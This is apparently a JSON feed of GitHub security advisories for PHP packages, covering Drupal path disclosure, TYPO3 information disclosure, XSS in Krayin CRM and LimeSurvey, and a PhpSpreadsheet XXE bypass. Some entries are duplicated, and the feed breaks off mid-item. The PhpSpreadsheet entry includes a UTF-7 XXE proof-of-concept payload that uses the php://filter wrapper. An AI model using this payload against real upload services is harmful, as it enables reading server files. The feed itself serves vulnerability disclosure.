{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45440\">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/issues/3457781\">https://www.drupal.org/project/drupal/issues/3457781</a></li>\n<li><a href=\"https://senscybersecurity.nl/CVE-2024-45440-Explained\">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4827\">https://github.com/github/advisory-database/pull/4827</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.3.6\">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/11.0.5\">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.2.9\">https://www.drupal.org/project/drupal/releases/10.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg8j-w93w-xjgc\">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc",
            "title": "[drupal/core] Drupal Full Path Disclosure",
            "date_modified": "2024-10-08T14:54:52.000Z",
            "date_published": "2024-08-29T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45440\">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/issues/3457781\">https://www.drupal.org/project/drupal/issues/3457781</a></li>\n<li><a href=\"https://senscybersecurity.nl/CVE-2024-45440-Explained\">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4827\">https://github.com/github/advisory-database/pull/4827</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.3.6\">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/11.0.5\">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.2.9\">https://www.drupal.org/project/drupal/releases/10.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg8j-w93w-xjgc\">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc",
            "title": "[drupal/core-recommended] Drupal Full Path Disclosure",
            "date_modified": "2024-10-08T14:54:52.000Z",
            "date_published": "2024-08-29T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45440\">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/issues/3457781\">https://www.drupal.org/project/drupal/issues/3457781</a></li>\n<li><a href=\"https://senscybersecurity.nl/CVE-2024-45440-Explained\">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4827\">https://github.com/github/advisory-database/pull/4827</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.3.6\">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/11.0.5\">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.2.9\">https://www.drupal.org/project/drupal/releases/10.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg8j-w93w-xjgc\">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc",
            "title": "[drupal/drupal] Drupal Full Path Disclosure",
            "date_modified": "2024-10-08T14:54:52.000Z",
            "date_published": "2024-08-29T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45440\">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/issues/3457781\">https://www.drupal.org/project/drupal/issues/3457781</a></li>\n<li><a href=\"https://senscybersecurity.nl/CVE-2024-45440-Explained\">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4827\">https://github.com/github/advisory-database/pull/4827</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.3.6\">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/11.0.5\">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.2.9\">https://www.drupal.org/project/drupal/releases/10.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg8j-w93w-xjgc\">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc",
            "title": "[drupal/core] Drupal Full Path Disclosure",
            "date_modified": "2024-10-08T14:54:52.000Z",
            "date_published": "2024-08-29T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45440\">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/issues/3457781\">https://www.drupal.org/project/drupal/issues/3457781</a></li>\n<li><a href=\"https://senscybersecurity.nl/CVE-2024-45440-Explained\">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4827\">https://github.com/github/advisory-database/pull/4827</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.3.6\">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/11.0.5\">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.2.9\">https://www.drupal.org/project/drupal/releases/10.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg8j-w93w-xjgc\">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc",
            "title": "[drupal/core-recommended] Drupal Full Path Disclosure",
            "date_modified": "2024-10-08T14:54:52.000Z",
            "date_published": "2024-08-29T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45440\">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/issues/3457781\">https://www.drupal.org/project/drupal/issues/3457781</a></li>\n<li><a href=\"https://senscybersecurity.nl/CVE-2024-45440-Explained\">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4827\">https://github.com/github/advisory-database/pull/4827</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.3.6\">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/11.0.5\">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>\n<li><a href=\"https://www.drupal.org/project/drupal/releases/10.2.9\">https://www.drupal.org/project/drupal/releases/10.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg8j-w93w-xjgc\">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc",
            "title": "[drupal/drupal] Drupal Full Path Disclosure",
            "date_modified": "2024-10-08T14:54:52.000Z",
            "date_published": "2024-08-29T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg8j-w93w-xjgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"problem\">Problem</h3>\n<p>Backend users could see items in the backend page tree without having access if the mounts pointed to pages restricted for their user/group, or if no mounts were configured but the pages allowed access to \"everybody.\" However, affected users could not manipulate these pages.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Update to TYPO3 versions 10.4.46 ELTS, 11.5.40 LTS, 12.4.21 LTS, 13.3.1 that fix the problem described.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Peter Schuler who reported this issue and to TYPO3 core &amp; security team member Oliver Hader who fixed the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/TYPO3/typo3/security/advisories/GHSA-rf5m-h8q9-9w6q\">https://github.com/TYPO3/typo3/security/advisories/GHSA-rf5m-h8q9-9w6q</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/8b024b08a2c7071a2f2ff7c758766e4e9273f83c\">https://github.com/TYPO3-CMS/backend/commit/8b024b08a2c7071a2f2ff7c758766e4e9273f83c</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/9ae1ef969b63292a13f80955a95713cabd45cc22\">https://github.com/TYPO3-CMS/backend/commit/9ae1ef969b63292a13f80955a95713cabd45cc22</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/a7b3c924014ada61632cd5e3fb9825fcc86c5719\">https://github.com/TYPO3-CMS/backend/commit/a7b3c924014ada61632cd5e3fb9825fcc86c5719</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-core-sa-2024-012\">https://typo3.org/security/advisory/typo3-core-sa-2024-012</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf5m-h8q9-9w6q\">https://github.com/advisories/GHSA-rf5m-h8q9-9w6q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf5m-h8q9-9w6q",
            "title": "[typo3/cms-backend] Information Disclosure in TYPO3 Page Tree",
            "date_modified": "2024-10-08T14:37:09.000Z",
            "date_published": "2024-10-08T14:37:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf5m-h8q9-9w6q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"problem\">Problem</h3>\n<p>Backend users could see items in the backend page tree without having access if the mounts pointed to pages restricted for their user/group, or if no mounts were configured but the pages allowed access to \"everybody.\" However, affected users could not manipulate these pages.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Update to TYPO3 versions 10.4.46 ELTS, 11.5.40 LTS, 12.4.21 LTS, 13.3.1 that fix the problem described.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Peter Schuler who reported this issue and to TYPO3 core &amp; security team member Oliver Hader who fixed the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/TYPO3/typo3/security/advisories/GHSA-rf5m-h8q9-9w6q\">https://github.com/TYPO3/typo3/security/advisories/GHSA-rf5m-h8q9-9w6q</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/8b024b08a2c7071a2f2ff7c758766e4e9273f83c\">https://github.com/TYPO3-CMS/backend/commit/8b024b08a2c7071a2f2ff7c758766e4e9273f83c</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/9ae1ef969b63292a13f80955a95713cabd45cc22\">https://github.com/TYPO3-CMS/backend/commit/9ae1ef969b63292a13f80955a95713cabd45cc22</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/a7b3c924014ada61632cd5e3fb9825fcc86c5719\">https://github.com/TYPO3-CMS/backend/commit/a7b3c924014ada61632cd5e3fb9825fcc86c5719</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-core-sa-2024-012\">https://typo3.org/security/advisory/typo3-core-sa-2024-012</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf5m-h8q9-9w6q\">https://github.com/advisories/GHSA-rf5m-h8q9-9w6q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf5m-h8q9-9w6q",
            "title": "[typo3/cms-backend] Information Disclosure in TYPO3 Page Tree",
            "date_modified": "2024-10-08T14:37:09.000Z",
            "date_published": "2024-10-08T14:37:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf5m-h8q9-9w6q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"problem\">Problem</h3>\n<p>Backend users could see items in the backend page tree without having access if the mounts pointed to pages restricted for their user/group, or if no mounts were configured but the pages allowed access to \"everybody.\" However, affected users could not manipulate these pages.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Update to TYPO3 versions 10.4.46 ELTS, 11.5.40 LTS, 12.4.21 LTS, 13.3.1 that fix the problem described.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Peter Schuler who reported this issue and to TYPO3 core &amp; security team member Oliver Hader who fixed the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/TYPO3/typo3/security/advisories/GHSA-rf5m-h8q9-9w6q\">https://github.com/TYPO3/typo3/security/advisories/GHSA-rf5m-h8q9-9w6q</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/8b024b08a2c7071a2f2ff7c758766e4e9273f83c\">https://github.com/TYPO3-CMS/backend/commit/8b024b08a2c7071a2f2ff7c758766e4e9273f83c</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/9ae1ef969b63292a13f80955a95713cabd45cc22\">https://github.com/TYPO3-CMS/backend/commit/9ae1ef969b63292a13f80955a95713cabd45cc22</a></li>\n<li><a href=\"https://github.com/TYPO3-CMS/backend/commit/a7b3c924014ada61632cd5e3fb9825fcc86c5719\">https://github.com/TYPO3-CMS/backend/commit/a7b3c924014ada61632cd5e3fb9825fcc86c5719</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-core-sa-2024-012\">https://typo3.org/security/advisory/typo3-core-sa-2024-012</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf5m-h8q9-9w6q\">https://github.com/advisories/GHSA-rf5m-h8q9-9w6q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf5m-h8q9-9w6q",
            "title": "[typo3/cms-backend] Information Disclosure in TYPO3 Page Tree",
            "date_modified": "2024-10-08T14:37:09.000Z",
            "date_published": "2024-10-08T14:37:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf5m-h8q9-9w6q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Krayin CRM v1.3.0 is vulnerable to Cross Site Scripting (XSS) via the organization name field in <code>/admin/contacts/organizations/edit/2</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45932\">https://nvd.nist.gov/vuln/detail/CVE-2024-45932</a></li>\n<li><a href=\"https://github.com/AslamMahi/CVE-Aslam-Mahi/blob/main/Laravel%20CRM%20v1.3.0/CVE-2024-45932.md\">https://github.com/AslamMahi/CVE-Aslam-Mahi/blob/main/Laravel%20CRM%20v1.3.0/CVE-2024-45932.md</a></li>\n<li><a href=\"https://krayincrm.com\">https://krayincrm.com</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-74q2-6jp4-3rqq\">https://github.com/advisories/GHSA-74q2-6jp4-3rqq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-74q2-6jp4-3rqq",
            "title": "[krayin/laravel-crm] Krayin CRM vulnerable to Cross Site Scripting (XSS) via the organization name",
            "date_modified": "2024-10-07T19:27:15.000Z",
            "date_published": "2024-10-07T18:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-74q2-6jp4-3rqq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting vulnerability in LimeSurvey before 6.5.12+240611 allows a remote attacker to execute arbitrary code via a crafted script to the title and comment fields.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28709\">https://nvd.nist.gov/vuln/detail/CVE-2024-28709</a></li>\n<li><a href=\"https://github.com/LimeSurvey/LimeSurvey/commit/c844c4fba81cc26ffe6544bf095bad6252910bc0\">https://github.com/LimeSurvey/LimeSurvey/commit/c844c4fba81cc26ffe6544bf095bad6252910bc0</a></li>\n<li><a href=\"https://www.limesurvey.org\">https://www.limesurvey.org</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c7xm-rwqj-pgcj\">https://github.com/advisories/GHSA-c7xm-rwqj-pgcj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c7xm-rwqj-pgcj",
            "title": "[limesurvey/limesurvey] LimeSurvey Cross Site Scripting vulnerability",
            "date_modified": "2024-10-07T19:26:38.000Z",
            "date_published": "2024-10-07T18:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c7xm-rwqj-pgcj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting vulnerability in LimeSurvey before 6.5.0+240319 allows a remote attacker to execute arbitrary code via a lack of input validation and output encoding in the Alert Widget's message component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28710\">https://nvd.nist.gov/vuln/detail/CVE-2024-28710</a></li>\n<li><a href=\"https://github.com/LimeSurvey/LimeSurvey/commit/c2fd60f94bc1db275f20cbb27a3135a9bdfb7f10\">https://github.com/LimeSurvey/LimeSurvey/commit/c2fd60f94bc1db275f20cbb27a3135a9bdfb7f10</a></li>\n<li><a href=\"https://www.limesurvey.org\">https://www.limesurvey.org</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-632q-77qj-c89q\">https://github.com/advisories/GHSA-632q-77qj-c89q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-632q-77qj-c89q",
            "title": "[limesurvey/limesurvey] LimeSurvey Cross Site Scripting vulnerability",
            "date_modified": "2024-10-07T19:02:00.000Z",
            "date_published": "2024-10-07T18:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-632q-77qj-c89q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>\n<h3 id=\"details\">Details</h3>\n<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>\n<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding=\"*\"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>\n<pre><code>$patterns = [\n           '/encoding=\"([^\"]*]?)\"/',\n           \"/encoding='([^']*?)'/\",\n];\n</code></pre>\n<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>Needed:</p>\n<ul>\n<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>\n</ul>\n<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE abc [ ... ]&gt;\n</code></pre>\n<h4 id=\"step-by-step\">Step-by-step</h4>\n<ol>\n<li>First off, the following string is encoded in base64:</li>\n</ol>\n<pre><code>&lt;!ENTITY internal 'abc'  &gt;\" \n</code></pre>\n<p>Resulting in:</p>\n<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\n</code></pre>\n<ol start=\"2\">\n<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>\n</ol>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\" &gt; %xxe;]&gt;\n&lt;sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"1\" uniqueCount=\"1\"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;\n</code></pre>\n<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>\n<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c\">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331\">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf\">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45293\">https://nvd.nist.gov/vuln/detail/CVE-2024-45293</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88",
            "title": "[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2024-10-07T22:30:08.000Z",
            "date_published": "2024-10-07T15:58:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>\n<h3 id=\"details\">Details</h3>\n<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>\n<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding=\"*\"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>\n<pre><code>$patterns = [\n           '/encoding=\"([^\"]*]?)\"/',\n           \"/encoding='([^']*?)'/\",\n];\n</code></pre>\n<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>Needed:</p>\n<ul>\n<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>\n</ul>\n<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE abc [ ... ]&gt;\n</code></pre>\n<h4 id=\"step-by-step\">Step-by-step</h4>\n<ol>\n<li>First off, the following string is encoded in base64:</li>\n</ol>\n<pre><code>&lt;!ENTITY internal 'abc'  &gt;\" \n</code></pre>\n<p>Resulting in:</p>\n<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\n</code></pre>\n<ol start=\"2\">\n<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>\n</ol>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\" &gt; %xxe;]&gt;\n&lt;sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"1\" uniqueCount=\"1\"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;\n</code></pre>\n<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>\n<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c\">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331\">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf\">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45293\">https://nvd.nist.gov/vuln/detail/CVE-2024-45293</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88",
            "title": "[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2024-10-07T22:30:08.000Z",
            "date_published": "2024-10-07T15:58:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88"
            },
            "tags": [
                "severity"
            ]
        },
        {
